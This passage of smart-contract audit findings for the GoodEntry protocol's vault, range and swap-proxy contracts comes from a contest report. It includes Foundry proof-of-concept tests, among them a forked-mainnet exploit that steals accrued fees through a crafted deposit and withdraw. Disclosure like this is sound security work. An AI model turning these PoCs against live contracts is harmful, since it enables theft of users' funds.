deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds. ## Proof of Concept The [GeVault.deposit()](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L247) function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The [GeVault.rebalance()](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L202) function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks: ```solidity function rebalance() public {     require(poolMatchesOracle(), \"GEV: Oracle Error\");     removeFromAllTicks();     if (isEnabled) deployAssets(); } ```  The `GeVault.deployAssets()` function calls the [GeVault.depositAndStash()](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L404) function, which actually deposits tokens into a `TokenisableRange` contract by calling the [TokenisableRange.deposit()](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/TokenisableRange.sol#L222). The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller: ```solidity (uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(     ... );  ...  _mint(msg.sender, lpAmt); TOKEN0.token.safeTransfer( msg.sender, n0 - added0); TOKEN1.token.safeTransfer( msg.sender, n1 - added1); ```  However, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.  Moreover, the contract won't include them in the TVL calculation: 1. The [GeVault.getTVL()](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L392) function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault. 1. The [GeVault.getTickBalance()](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L420) function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted. 1. The [TokenisableRange.latestAnswer()](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/TokenisableRange.sol#L361) function computes the total value ([TokenisableRange.sol#L355](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/TokenisableRange.sol#L355)) of the liquidity deposited into the Uniswap pool ([TokenisableRange.sol#L338](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/TokenisableRange.sol#L338)). Thus, the unused tokens won't be counted here as well. 1. The [GeVault.getTVL()](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L220-L223) function is used to compute the amount of tokens to return to the depositor during withdrawal.  Thus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.  ## Tools Used Manual review ## Recommended Mitigation Steps In the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing. Alternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.   ## Assessed type  Token-Transfer"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/315", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-14"], "target": "2023-08-goodentry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-goodentry-findings/blob/main/data/ReyAdmirado-G.md)."}, {"title": "User can steal refunded underlying tokens from `initRange` operation inside `RangeManager`", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/254", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/RangeManager.sol#L95-L102 https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/TokenisableRange.sol#L134-L163   # Vulnerability details  ## Impact After the owner of `RangeManager` create new range via `generateRange`, they can then call `initRange` to init the range and providing the initial underlying tokens for initial uniswap v3 mint amounts. However, after operation the refunded underlying tokens is not send back to the owner, this will allow user to steal this token by triggering `cleanup()`.  ## Proof of Concept  When `initRange` is called, it will trigger `init` inside the `TokenisableRange` :  https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/RangeManager.sol#L95-L102  ```solidity   function initRange(address tr, uint amount0, uint amount1) external onlyOwner {     ASSET_0.safeTransferFrom(msg.sender, address(this), amount0);     ASSET_0.safeIncreaseAllowance(tr, amount0);     ASSET_1.safeTransferFrom(msg.sender, address(this), amount1);     ASSET_1.safeIncreaseAllowance(tr, amount1);     TokenisableRange(tr).init(amount0, amount1);     ERC20(tr).safeTransfer(msg.sender, TokenisableRange(tr).balanceOf(address(this)));   } ```  Inside `init`, it will try to mint Uniswap v3 NFT and provide initial liquidity based on desired underlying amount provided :  https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/TokenisableRange.sol#L134-L163  ```solidity   function init(uint n0, uint n1) external {     require(status == ProxyState.INIT_LP, \"!InitLP\");     require(msg.sender == creator, \"Unallowed call\");     status = ProxyState.READY;     TOKEN0.token.safeTransferFrom(msg.sender, address(this), n0);     TOKEN1.token.safeTransferFrom(msg.sender, address(this), n1);     TOKEN0.token.safeIncreaseAllowance(address(POS_MGR), n0);     TOKEN1.token.safeIncreaseAllowance(address(POS_MGR), n1);     (tokenId, liquidity, , ) = POS_MGR.mint(        INonfungiblePositionManager.MintParams({          token0: address(TOKEN0.token),          token1: address(TOKEN1.token),          fee: feeTier * 100,          tickLower: lowerTick,          tickUpper: upperTick,          amount0Desired: n0,          amount1Desired: n1,          amount0Min: n0 * 95 / 100,          amount1Min: n1 * 95 / 100,          recipient: address(this),          deadline: block.timestamp       })     );          // Transfer remaining assets back to user     TOKEN0.token.safeTransfer( msg.sender,  TOKEN0.token.balanceOf(address(this)));     TOKEN1.token.safeTransfer(msg.sender, TOKEN1.token.balanceOf(address(this)));     _mint(msg.sender, 1e18);     emit Deposit(msg.sender, 1e18);   } ```  Uniswap `mint` will always refund the unused underlying tokens, in this case, the `init` will send it back to `RangeManager`.  However, inside `initRange`, it will only transfer to `msg.sender` the minted `tr` token, the remaining underlying token will stay inside this `RangeManager`.  Now user that aware of this `initRange` operation called by admin, can back-run the operation with calling `removeAssetsFromStep` that will trigger `cleanup` function to sweep the token :  https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/RangeManager.sol#L190-L207  ```solidity   function cleanup() internal {     uint256 asset0_amt = ASSET_0.balanceOf(address(this));     uint256 asset1_amt = ASSET_1.balanceOf(address(this));          if (asset0_amt > 0) {       ASSET_0.safeIncreaseAllowance(address(LENDING_POOL), asset0_amt);       LENDING_POOL.deposit(address(ASSET_0), asset0_amt, msg.sender, 0);     }          if (asset1_amt > 0) {       ASSET_1.safeIncreaseAllowance(address(LENDING_POOL), asset1_amt);       LENDING_POOL.deposit(address(ASSET_1), asset1_amt, msg.sender, 0);     }          // Check that health factor is not put into liquidation / with buffer     (,,,,,uint256 hf) = LENDING_POOL.getUserAccountData(msg.sender);     require(hf > 1.01e18, \"Health factor is too low\");   } ``` NOTE : This scenario is not an admin mistake, as the uniswap `mint` operation is very likely to refund underlying tokens (https://docs.uniswap.org/contracts/v3/guides/providing-liquidity/mint-a-position#updating-the-deposit-mapping-and-refunding-the-calling-address)   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider to add `cleanup` after the `initRange` call :  ```diff   function initRange(address tr, uint amount0, uint amount1) external onlyOwner {     ASSET_0.safeTransferFrom(msg.sender, address(this), amount0);     ASSET_0.safeIncreaseAllowance(tr, amount0);     ASSET_1.safeTransferFrom(msg.sender, address(this), amount1);     ASSET_1.safeIncreaseAllowance(tr, amount1);     TokenisableRange(tr).init(amount0, amount1);     ERC20(tr).safeTransfer(msg.sender, TokenisableRange(tr).balanceOf(address(this))); +   cleanup();   } ```   ## Assessed type  Uniswap"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/208", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-17"], "target": "2023-08-goodentry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-goodentry-findings/blob/main/data/Sathish9098-G.md)."}, {"title": "returnExpectedBalanceWithoutFees can process using 0 calculated prices for certain uniswap v3 pair", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/162", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden", "Q-15"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/TokenisableRange.sol#L333-L339   # Vulnerability details  ## Impact `returnExpectedBalanceWithoutFees` is a crucial function that will return the amount of token0 and token1 from the given price, ticks price and liquidity. However, the calculation of sqrt price using oracle price has very minimal underflow protection, could go underflow for certain pairs.  ## Proof of Concept  This is the calculation inside `returnExpectedBalanceWithoutFees` :  https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/TokenisableRange.sol#L338  ```solidity   function returnExpectedBalanceWithoutFees(uint TOKEN0_PRICE, uint TOKEN1_PRICE) internal view returns (uint256 amt0, uint256 amt1) {     // if 0 get price from oracle     if (TOKEN0_PRICE == 0) TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));     if (TOKEN1_PRICE == 0) TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));      (amt0, amt1) = LiquidityAmounts.getAmountsForLiquidity( uint160( sqrt( (2 ** 192 * ((TOKEN0_PRICE * 10 ** TOKEN1.decimals) / TOKEN1_PRICE)) / ( 10 ** TOKEN0.decimals ) ) ), TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick),  liquidity);   } ```  It can be observed that it has inner calculation :  ```solidity (TOKEN0_PRICE * 10 ** TOKEN1.decimals) / TOKEN1_PRICE) ```  This calculation have very minimal underflow protection (`(TOKEN0_PRICE * 10 ** TOKEN1.decimals)` must be greater than `TOKEN1_PRICE`), especially when `TOKEN1.decimals` is low and `TOKEN0_PRICE` value is very low compared to `TOKEN1_PRICE`.  When this happened (price underflow to 0) and passed to `getAmountsForLiquidity`, the function will always process and return only `amt0`. This will result wrong amount is calculated and used when deciding amount to process inside `claimFees`.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Change the operation when calculating price using this calculation to improve overflow/underflow protection :  ```solidity sqrt((TOKEN0_PRICE * 10 ** TOKEN1.decimals * 2 ** 96) / (TOKEN1_PRICE * 10 ** TOKEN0.decimals)) * 2 **48 ```  reference : https://github.com/makerdao/univ3-lp-oracle      ## Assessed type  Math"}, {"title": "Overflow can still happened when calculating `priceX8` inside `poolMatchesOracle` operation", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/140", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-03"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/GeVault.sol#L367-L378   # Vulnerability details  ## Impact `poolMatchesOracle` is used to compare price calculated from uniswap v3 pool and chainlink oracle and decide whether rebalance should happened or not. `priceX8` will be holding price information calculated using `sqrtPriceX96` and when operations is performed, it will try to scale down using `2 ** 12`. However, the scale down is not enough and overflow can still happened.  ## Proof of Concept Consider this scenario, The GeVault is using WBTC for `token0` and WETH for `token1`.  These are information for the WBTC/WETH from uniswap v3 pool (0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0):  slot0 data (at current time) :  ``` sqrtPriceX96   uint160 :  31520141554881197083247204479961147 ```  `token0` (WBTC) decimals is 8 and `token1` (WETH) decimals is 18.  Using these information, try to reproduce the `priceX8` calculation :  ```solidity     function testOraclePrice() public {         uint160 sqrtPriceX96 = 31520141554881197083247204479961147;         // decimals0 is 8         uint priceX8 = 10 ** 8;         // Overflow if dont scale down the sqrtPrice before div 2*192          // @audit - the overflow still possible         priceX8 =             (priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8) /             2 ** 168;         // decimals1 is 18         priceX8 = priceX8 / 10 ** 18;         assertEq(true, true);     } ```  the test result in overflow :  ``` [FAIL. Reason: Arithmetic over/underflow] testOraclePrice()  ```  This will cause calculation still overflow, even using the widely used WBTC/WETH pair   ## Tools Used  Manual review  ## Recommended Mitigation Steps  Consider to change the scale down using the recommended value from uniswap v3 library:  https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69  or change the scale down similar to the one used inside library  ```diff   function poolMatchesOracle() public view returns (bool matches){     (uint160 sqrtPriceX96,,,,,,) = uniswapPool.slot0();          uint decimals0 = token0.decimals();     uint decimals1 = token1.decimals();     uint priceX8 = 10**decimals0;     // Overflow if dont scale down the sqrtPrice before div 2*192 -    priceX8 = priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8 / 2**168; +    priceX8 = priceX8 * (uint(sqrtPriceX96) ** 2 / 2 ** 64) * 1e8 / 2**128;     priceX8 = priceX8 / 10**decimals1;     uint oraclePrice = 1e8 * oracle.getAssetPrice(address(token0)) / oracle.getAssetPrice(address(token1));     if (oraclePrice < priceX8 * 101 / 100 && oraclePrice > priceX8 * 99 / 100) matches = true;   } ```         ## Assessed type  Math"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/86", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-10"], "target": "2023-08-goodentry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-goodentry-findings/blob/main/data/3docSec-Q.md)."}, {"title": "TokenisableRange's incorrect accounting of non-reinvested fees in \"deposit\" exposes the fees to a flash-loan attack ", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/85", "labels": ["bug", "3 (High Risk)", "selected for report", "sponsor confirmed", "edited-by-warden", "H-04"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L190 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L268   # Vulnerability details  The `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.  When a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).  To prevent users from stealing fees, there are several mechanisms in place: 1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees 2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"  Both of these mechanisms can however be worked around: 1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions. 2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".  ## Impact Given a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.  ## Proof of Concept Below is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity: ```Solidity     function testStolenFeesPoc() public {         vm.createSelectFork(             \"mainnet\",             17811921         );          vm.prank(tokenWhale);         USDC.transfer(alice, 100_000e6);          vm.startPrank(alice);         TokenisableRange tr = new TokenisableRange();          // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921);          // the pool will hold 0 WETH         tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);          USDC.approve(address(tr), 100_000e6);         tr.init(100_000e6, 0);          // time passes, and the pool trades in range, accumulating fees         uint256 fee0 = 1_000e6;         uint256 fee1 = 2e18;          vm.mockCall(address(UniswapV3UsdcNFPositionManager),              abi.encodeWithSelector(INonfungiblePositionManager.collect.selector),              abi.encode(fee0, fee1));          vm.stopPrank();         vm.startPrank(tokenWhale);         USDC.transfer(address(tr), fee0);         WETH.transfer(address(tr), fee1);          // now the price is back to 1870 USDC,         // the undistributed fees are 1k USDC and 2 WETH,          // in total about $5k or 5% of the pool value          // (the percentage can be higher with bigger price swings)         // but still, they are not reinvested         tr.claimFee();         vm.clearMockedCalls();         require(tr.fee0() != 0);         require(tr.fee1() != 0);          // an attacker now can flashloan & deposit an amount that will give them         // the majority of the pool liquidity, then withdraw for a profit         uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);         uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);         uint256 poolSharesBefore = tr.balanceOf(tokenWhale);          USDC.approve(address(tr), 10_000_000e6);         // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't         // count the value locked in fees in assigning the LP tokens         WETH.approve(address(tr), 1000);         uint256 deposited = tr.deposit(10_000_000e6, 1000);         tr.withdraw(deposited, 0, 0);          // the profit here is         // 1 wei of USDC lost, probably to rounding         console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore));          // 1.58 WETH of profit, which is most of the fees,          // and definitely more than 1% of the pool. Yay!          console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));         require(poolSharesBefore ==  tr.balanceOf(tokenWhale));     } ``` It is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled: > Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert  ## Tools Used Code review  ## Recommended Mitigation Steps - factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool - when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool: ```diff     // Stack too deep, so localising some variables for feeLiquidity calculations  -    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity -    if ( newFee0 == 0 && newFee1 == 0 ){ +    {       uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));       uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));       require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");       // Calculate the equivalent liquidity amount of the non-yet compounded fees       // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity        feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )                                        / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) );      } ```            ## Assessed type  Math"}, {"title": "Return value of low level `call` not checked.", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/83", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/helper/V3Proxy.sol#L156 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/helper/V3Proxy.sol#L174 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/helper/V3Proxy.sol#L192   # Vulnerability details  ## Impact Detailed description of the impact of this finding.  The return value of low level `call` is not checked.  If the `msg.sender` is a contract and its `receive()` function has the potential to revert, the code `payable(msg.sender).call{value:wad}(\"\")` could potentially return a false result, which is not being verified. As a result, the calling functions may exit without successfully returning ethers to senders.   ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/helper/V3Proxy.sol#L147C1-L158C6 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/helper/V3Proxy.sol#L160C1-L176C6 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/helper/V3Proxy.sol#L178C1-L194C6  POC using Foundry: ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\";  contract CallerContract {      VaultContract private vaultAddress;     constructor(VaultContract _vaultAddr) payable {         vaultAddress = _vaultAddr;     }      receive() payable external {         revert();     }      function claim(uint256 amount) public {         vaultAddress.claimEther(amount);     }  }  contract VaultContract {     CallerContract private callerContract;     constructor() payable {}      receive() payable external {         revert();     }      function claimEther(uint256 amount) public {         require(amount <= 3 ether, \"Cannot claim more than 3 ether\");         msg.sender.call{value:amount}(\"\");         //(bool sent,) = msg.sender.call{value: amount}(\"\");         //require(sent, \"sent failed\");     }      function sendEither() payable external {         callerContract.claim(3 ether);     }      function setCaller(CallerContract _caller) public {         callerContract = _caller;     }  }  contract CallReturnValueNotCheckedTest is Test {      address public Bob;     VaultContract public vaultContract;     CallerContract public callerContract;      function setUp() public {         Bob = makeAddr(\"Bob\");         vaultContract = new VaultContract();         callerContract = new CallerContract(vaultContract);         vaultContract.setCaller(callerContract);         deal(Bob, 10 ether);     }      function test_callReturnNotChecked() public {         console2.log(\"Before calling: Bob balance is %d ether\", Bob.balance / 1e18);         console2.log(\"Before calling: Vault balance is %d ether\", address(vaultContract).balance / 1e18);         console2.log(\"Bob sends 3 ether\");         vm.startPrank(Bob);         //vm.expectRevert();         vaultContract.sendEither{value: 3 ether}();         console2.log(\"After  calling: Bob balance is %d ether\", Bob.balance / 1e18);         console2.log(\"After  calling: Vault balance is %d ether\", address(vaultContract).balance / 1e18);         vm.stopPrank();      } }  ``` The output is: ```log Running 1 test for test/ReturnValueTest.t.sol:CallReturnValueNotCheckedTest [PASS] test_callReturnNotChecked() (gas: 42207) Logs:   Before calling: Bob balance is 10 ether   Before calling: Vault balance is 0 ether   Bob sends 3 ether   After  calling: Bob balance is 7 ether   After  calling: Vault balance is 3 ether  Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 762.13\u00b5s Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests) ```  The caller contract fails to receive ether, but the whole transaction is not reverted. As a result, the ether will be locked in the `Vault` contract.   This issue can be prevented by adding logic to check the return value of `call`. ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\";  contract CallerContract {      VaultContract private vaultAddress;     constructor(VaultContract _vaultAddr) payable {         vaultAddress = _vaultAddr;     }      receive() payable external {         revert();     }      function claim(uint256 amount) public {         vaultAddress.claimEther(amount);     }  }  contract VaultContract {     CallerContract private callerContract;     constructor() payable {}      receive() payable external {         revert();     }      function claimEther(uint256 amount) public {         require(amount <= 3 ether, \"Cannot claim more than 3 ether\");         //msg.sender.call{value:amount}(\"\");         (bool sent,) = msg.sender.call{value: amount}(\"\");         require(sent, \"sent failed\");     }      function sendEither() payable external {         callerContract.claim(3 ether);     }      function setCaller(CallerContract _caller) public {         callerContract = _caller;     }  }  contract CallReturnValueNotCheckedTest is Test {      address public Bob;     VaultContract public vaultContract;     CallerContract public callerContract;      function setUp() public {         Bob = makeAddr(\"Bob\");         vaultContract = new VaultContract();         callerContract = new CallerContract(vaultContract);         vaultContract.setCaller(callerContract);         deal(Bob, 10 ether);     }      function test_callReturnNotChecked() public {         console2.log(\"Before calling: Bob balance is %d ether\", Bob.balance / 1e18);         console2.log(\"Before calling: Vault balance is %d ether\", address(vaultContract).balance / 1e18);         console2.log(\"Bob sends 3 ether\");         vm.startPrank(Bob);         //vm.expectRevert();         vaultContract.sendEither{value: 3 ether}();         console2.log(\"After  calling: Bob balance is %d ether\", Bob.balance / 1e18);         console2.log(\"After  calling: Vault balance is %d ether\", address(vaultContract).balance / 1e18);         vm.stopPrank();      }      function test_callReturnChecked_revert() public {         console2.log(\"Before calling: Bob balance is %d ether\", Bob.balance / 1e18);         console2.log(\"Before calling: Vault balance is %d ether\", address(vaultContract).balance / 1e18);         console2.log(\"Bob sends 3 ether\");         vm.startPrank(Bob);         vm.expectRevert();         vaultContract.sendEither{value: 3 ether}();         console2.log(\"After  calling: Bob balance is %d ether\", Bob.balance / 1e18);         console2.log(\"After  calling: Vault balance is %d ether\", address(vaultContract).balance / 1e18);         vm.stopPrank();      } } ```  Output of modified code: ```log Running 1 test for test/ReturnValueTest.t.sol:CallReturnValueNotCheckedTest [PASS] test_callReturnChecked_revert() (gas: 42788) Logs:   Before calling: Bob balance is 10 ether   Before calling: Vault balance is 0 ether   Bob sends 3 ether   After  calling: Bob balance is 10 ether   After  calling: Vault balance is 0 ether  Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.60ms Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests) ``` Now the ether is returned back if call is failed.   ## Tools Used Foundry  ## Recommended Mitigation Steps It's recommended to check the return value to be true or just use OpenZeppelin `Address` library `sendValue()` function for ether transfer. See https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/utils/Address.sol#L64 .     ## Assessed type  call/delegatecall"}, {"title": "V3Proxy swapTokensForExactETH does not send back to the caller the unused input tokens", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/64", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-05"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/helper/V3Proxy.sol#L174   # Vulnerability details  The `V3Proxy` `swapTokensForExactETH` function swaps an unspecified amount of a given ERC-20 for a specified amount of the native currency. After the swap happens, however, the difference between the amount taken from the caller (`amountInMax`) and the actual swapped amount (`amounts[0]`) is not given back to the caller and remains locked in the contract.  ## Impact Any user of the `swapTokensForExactETH` will always pay `amountInMax` for swaps even if part of it was not used for the swap. This part is lost, locked in the `V3Proxy` contract.  ## Proof of Concept - call `swapTokensForExactETH` with an excessively high `amountInMax` - check that any extra input tokens are sent back - this check will fail ```Solidity     function testV3ProxyKeepsTheChange() public {         IQuoter q = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);         ISwapRouter r = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);          V3Proxy v3proxy = new V3Proxy(r, q, 500);         vm.label(address(v3proxy), \"V3Proxy\");          address[] memory path = new address[](2);         path[0] = address(USDC);         path[1] = address(WETH);          address[] memory path2 = new address[](2);         path2[0] = address(WETH);         path2[1] = address(USDC);           // fund Alice         vm.prank(tokenWhale);         USDC.transfer(alice, 1870e6);          // Alice initiates a swap         uint256[] memory amounts;          uint256 balanceUsdcBefore = USDC.balanceOf(alice);         uint256 balanceBefore = alice.balance;         vm.startPrank(alice);         USDC.approve(address(v3proxy), 1870e6);         amounts = v3proxy.swapTokensForExactETH(1e18, 1870e6, path, alice, block.timestamp);          // we check if the swap was done well         require(amounts[0] < 1870e6);         require(amounts[1] == 1e18);         require(alice.balance == balanceBefore + amounts[1]);          // the following check fails, but would pass if swapTokensForExactETH         // sent back the excess tokens         require(USDC.balanceOf(alice) == balanceUsdcBefore - amounts[0],              \"Unused input tokens were not sent back!\");     } ```  ## Tools Used Code review  ## Recommended Mitigation Steps Send back the excess tokens: ```diff     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) payable external returns (uint[] memory amounts) {         require(path.length == 2, \"Direct swap only\");         require(path[1] == ROUTER.WETH9(), \"Invalid path\");         ERC20 ogInAsset = ERC20(path[0]);         ogInAsset.safeTransferFrom(msg.sender, address(this), amountInMax);         ogInAsset.safeApprove(address(ROUTER), amountInMax);         amounts = new uint[](2);         amounts[0] = 